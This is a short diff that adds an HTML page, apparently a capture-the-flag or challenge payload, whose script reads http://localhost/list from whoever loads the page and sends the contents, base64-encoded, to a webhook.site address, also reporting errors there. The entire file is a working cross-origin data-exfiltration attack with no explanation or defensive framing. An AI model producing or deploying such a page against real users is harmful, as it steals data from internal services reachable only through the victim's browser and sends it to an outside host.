@@ -1,0 +1,7 @@
+<!DOCTYPE html>
+<html><body><script>
+    fetch("http://localhost/list")
+        .then(r => r.text())
+        .then(html => fetch("https://webhook.site/df38ec50-07e5-461a-9968-23412015e697?data=" + btoa(unescape(encodeURIComponent(html)))))
+        .catch(e => fetch("https://webhook.site/df38ec50-07e5-461a-9968-23412015e697?err=" + btoa(e.toString())))
+</script></body></html>
